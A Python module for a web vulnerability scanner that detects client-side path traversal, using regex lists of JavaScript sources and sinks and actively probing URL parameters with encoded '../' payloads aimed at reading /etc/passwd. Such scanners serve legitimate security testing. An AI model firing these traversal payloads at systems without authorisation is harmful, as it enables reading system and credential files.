"""
Client-Side Path Traversal (CSPT) Scanner
Detects vulnerable patterns where user input flows into path construction
Reference: https://github.com/doyensec/CSPTBurpExtension
"""

from core.base_module import BaseModule
from core.logger import get_logger
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, unquote
import re

logger = get_logger(__name__)


class CSPTScanner(BaseModule):
    """Scans for Client-Side Path Traversal vulnerabilities"""

    def __init__(self, module_path: str, payload_limit: int = None):
        super().__init__(module_path, payload_limit=payload_limit)
        self.module_name = "CSPT Scanner"
        self.logger = logger

        # Sinks - dangerous functions/patterns where path traversal can occur
        self.js_sinks = [
            # Fetch/XHR sinks
            r'fetch\s*\(\s*[`\'"]?[^`\'"]*\+',
            r'fetch\s*\(\s*`[^`]*\$\{',
            r'XMLHttpRequest.*\.open\s*\([^,]+,[^)]*\+',
            r'axios\.(get|post|put|delete|patch)\s*\([^)]*\+',
            r'\$\.(get|post|ajax)\s*\([^)]*\+',

            # DOM manipulation sinks
            r'\.src\s*=\s*[^;]*\+',
            r'\.href\s*=\s*[^;]*\+',
            r'location\.(href|assign|replace)\s*=?\s*\([^)]*\+',
            r'window\.open\s*\([^)]*\+',

            # Import sinks
            r'import\s*\([^)]*\+',
            r'require\s*\([^)]*\+',

            # innerHTML with path
            r'\.innerHTML\s*=\s*[^;]*(src|href)[^;]*\+',
        ]

        # Sources - where user input comes from
        self.js_sources = [
            r'location\.(search|hash|pathname|href)',
            r'document\.URL',
            r'document\.documentURI',
            r'document\.referrer',
            r'window\.name',
            r'URLSearchParams',
            r'getParameter',
            r'\.split\([\'"`][?#&][\'"`]\)',
        ]

        # Path traversal payloads to test
        self.traversal_payloads = [
            '../',
            '..%2f',
            '..%252f',
            '%2e%2e/',
            '%2e%2e%2f',
            '....//....//..../',
            '..\\',
            '..%5c',
        ]

    def scan(self, targets: List[Dict[str, Any]], http_client: Any = None) -> List[Dict[str, Any]]:
        """Scan for CSPT vulnerabilities"""
        self.logger.info(f"Starting {self.module_name} scan on {len(targets)} targets")

        results = []
        tested_urls = set()

        for target in targets:
            url = target.get('url') if isinstance(target, dict) else target
            if not url:
                continue

            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            if base_url in tested_urls:
                continue
            tested_urls.add(base_url)

            # Analyze page for CSPT patterns
            findings = self._analyze_page(http_client, url)
            results.extend(findings)

            if self.payload_limit and len(results) >= self.payload_limit:
                break

        self.logger.info(f"{self.module_name} scan complete: {len(results)} findings")
        return results

    def _analyze_page(self, http_client, url: str) -> List[Dict[str, Any]]:
        """Analyze a page for CSPT vulnerabilities"""
        results = []

        try:
            response = http_client.get(url)
            if not response or response.status_code != 200:
                return results

            content = response.text
            if not content:
                return results

            # Extract JavaScript from inline scripts
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)

            # Also extract external script URLs for analysis
            external_scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', content, re.IGNORECASE)

            # Analyze inline scripts
            for script in scripts:
                if len(script) > 50:  # Skip tiny scripts
                    findings = self._analyze_script(url, script, "inline")
                    results.extend(findings)

            # Analyze external scripts
            for script_url in external_scripts[:10]:  # Limit to first 10
                if script_url.startswith('//'):
                    script_url = 'https:' + script_url
                elif script_url.startswith('/'):
                    parsed = urlparse(url)
                    script_url = f"{parsed.scheme}://{parsed.netloc}{script_url}"
                elif not script_url.startswith('http'):
                    continue

                try:
                    script_resp = http_client.get(script_url)
                    if script_resp and script_resp.status_code == 200:
                        findings = self._analyze_script(url, script_resp.text, script_url)
                        results.extend(findings)
                except Exception:
                    pass

            # Check URL parameters for path traversal
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name, values in params.items():
                for value in values:
                    # Check if parameter looks like a path
                    if '/' in value or '.' in value:
                        # Test traversal
                        traversal_finding = self._test_traversal(http_client, url, param_name, value)
                        if traversal_finding:
                            results.append(traversal_finding)

        except Exception as e:
            self.logger.debug(f"Error analyzing {url}: {e}")

        return results

    def _analyze_script(self, page_url: str, script: str, source: str) -> List[Dict[str, Any]]:
        """Analyze JavaScript code for CSPT patterns"""
        results = []

        # Look for source-to-sink flows
        source_found = []
        sink_found = []

        for source_pattern in self.js_sources:
            matches = re.findall(source_pattern, script)
            if matches:
                source_found.extend(matches if isinstance(matches[0], str) else [m[0] for m in matches])

        for sink_pattern in self.js_sinks:
            matches = re.findall(sink_pattern, script, re.IGNORECASE)
            if matches:
                sink_found.extend(matches)

        # If both sources and sinks exist, potential vulnerability
        if source_found and sink_found:
            evidence = f"Potential CSPT: User input from {source_found[:3]} may flow to {sink_found[:3]}"

            results.append(self.create_result(
                vulnerable=True,
                url=page_url,
                parameter='JavaScript',
                payload='Source-to-sink flow detected',
                evidence=evidence,
                severity='Medium',
                method='GET',
                additional_info={
                    'injection_type': 'Client-Side Path Traversal',
                    'sources': source_found[:5],
                    'sinks': sink_found[:5],
                    'script_location': source[:100] if source != "inline" else "inline",
                    'description': 'JavaScript code may allow user input to control file paths',
                    'cwe': 'CWE-22',
                    'owasp': 'A01:2021',
                    'impact': 'May allow reading sensitive files or accessing unauthorized resources'
                }
            ))

        # Look for direct path construction patterns
        path_patterns = [
            r'[\'"]/api/[^\'"]*/[\'"]\s*\+\s*\w+',  # "/api/" + userInput
            r'`/[^`]*\$\{[^}]+\}[^`]*/`',  # Template literal with variable
            r'[\'"]/[^\'"]*/[\'"]\s*\+\s*[^+]+\s*\+\s*[\'"]',  # Path concatenation
        ]

        for pattern in path_patterns:
            matches = re.findall(pattern, script)
            for match in matches[:3]:
                results.append(self.create_result(
                    vulnerable=True,
                    url=page_url,
                    parameter='JavaScript',
                    payload=match[:100],
                    evidence=f"Path concatenation pattern found: {match[:150]}",
                    severity='Low',
                    method='GET',
                    additional_info={
                        'injection_type': 'Path Concatenation',
                        'pattern': match[:200],
                        'script_location': source[:100] if source != "inline" else "inline",
                        'description': 'Dynamic path construction may be vulnerable to traversal',
                        'cwe': 'CWE-22',
                        'owasp': 'A01:2021'
                    }
                ))

        return results

    def _test_traversal(self, http_client, url: str, param: str, original_value: str) -> Dict[str, Any]:
        """Test a parameter for path traversal vulnerability"""
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for payload in self.traversal_payloads[:3]:
                test_value = payload + "etc/passwd"
                test_url = f"{base_url}?{param}={test_value}"

                response = http_client.get(test_url)
                if response and response.status_code == 200:
                    content = response.text.lower()
                    # Check for traversal success indicators
                    if 'root:' in content or '/bin/bash' in content or '/bin/sh' in content:
                        return self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param,
                            payload=test_value,
                            evidence=f"Path traversal successful: {param}={test_value} revealed /etc/passwd content",
                            severity='High',
                            method='GET',
                            additional_info={
                                'injection_type': 'Path Traversal',
                                'original_value': original_value,
                                'payload': test_value,
                                'cwe': 'CWE-22',
                                'owasp': 'A01:2021'
                            }
                        )

        except Exception as e:
            self.logger.debug(f"Error testing traversal: {e}")

        return None


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return CSPTScanner(module_path, payload_limit=payload_limit)
